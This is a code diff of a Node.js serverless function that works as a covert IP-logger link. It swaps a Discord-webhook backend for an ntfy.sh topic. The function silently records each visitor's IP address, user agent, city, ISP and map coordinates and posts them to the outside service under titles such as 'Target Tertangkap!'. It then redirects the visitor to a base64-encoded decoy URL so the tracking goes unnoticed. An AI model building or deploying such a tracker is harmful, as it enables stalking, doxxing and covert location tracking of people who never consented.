@@ -1,25 +1,14 @@
 const axios = require('axios');
 
 module.exports = async (req, res) => {
-    // Parameter parsing
-    // w = base64 encoded discord webhook
-    // t = base64 encoded target url to redirect to
-    const { w, t } = req.query;
+    const { topic, t } = req.query;
 
     let targetUrl = 'https://google.com';
     if (t) {
         try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
     }
 
-    if (!w) {
-        // If no webhook, just redirect
-        return res.redirect(301, targetUrl);
-    }
-
-    let webhookUrl;
-    try {
-        webhookUrl = Buffer.from(w, 'base64').toString('utf-8');
-    } catch (e) {
+    if (!topic) {
         return res.redirect(301, targetUrl);
     }
 
@@ -30,7 +19,6 @@ module.exports = async (req, res) => {
     // Get Geo Location using ip-api.com
     let geo = {};
     try {
-        // Just extract first IP if multiple
         const cleanIp = ip.split(',')[0].trim();
         const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
         geo = geoReq.data;
@@ -38,29 +26,27 @@ module.exports = async (req, res) => {
         // Silent fail
     }
 
-    // Build Discord Embed Tracker Payload
-    const payload = {
-        username: "SINTEL-HP TRACKER",
-        avatar_url: "https://i.imgur.com/4M34hiw.png",
-        embeds: [{
-            title: "🚨 TARGET TERDETEKSI (IP LOGGER) 🚨",
-            color: 16711680,
-            fields: [
-                { name: "📡 IP Address", value: `\`${ip}\``, inline: true },
-                { name: "🌍 Negara", value: geo.country || 'Unknown', inline: true },
-                { name: "🏙️ Kota/Region", value: `${geo.city || 'Unknown'}, ${geo.regionName || 'Unknown'}`, inline: true },
-                { name: "🏢 ISP / Provider", value: geo.isp || geo.org || 'Unknown', inline: false },
-                { name: "📍 Kordinat / Maps", value: geo.lat ? `[Klik untuk lihat di Google Maps](https://www.google.com/maps?q=${geo.lat},${geo.lon})` : 'Unknown', inline: false },
-                { name: "🖥️ User Agent (Perangkat)", value: `\`\`\`${userAgent}\`\`\``, inline: false }
-            ],
-            footer: { text: "SINTEL-HP | Real-time Target Logger" },
-            timestamp: new Date().toISOString()
-        }]
-    };
+    // Prepare JSON payload for the dashboard
+    const trackerData = JSON.stringify({
+        ip: ip,
+        country: geo.country || 'Unknown',
+        region: geo.regionName || 'Unknown',
+        city: geo.city || 'Unknown',
+        isp: geo.isp || geo.org || 'Unknown',
+        lat: geo.lat || null,
+        lon: geo.lon || null,
+        ua: userAgent,
+        time: new Date().toISOString()
+    });
 
-    // Send silently to discord
+    // Push silently to Ntfy (Free open source pubsub)
     try {
-        await axios.post(webhookUrl, payload);
+        await axios.post(`https://ntfy.sh/${topic}`, trackerData, {
+            headers: {
+                'Title': 'Target Tertangkap!',
+                'Tags': 'skull'
+            }
+        });
     } catch (err) {
         // silent
     }
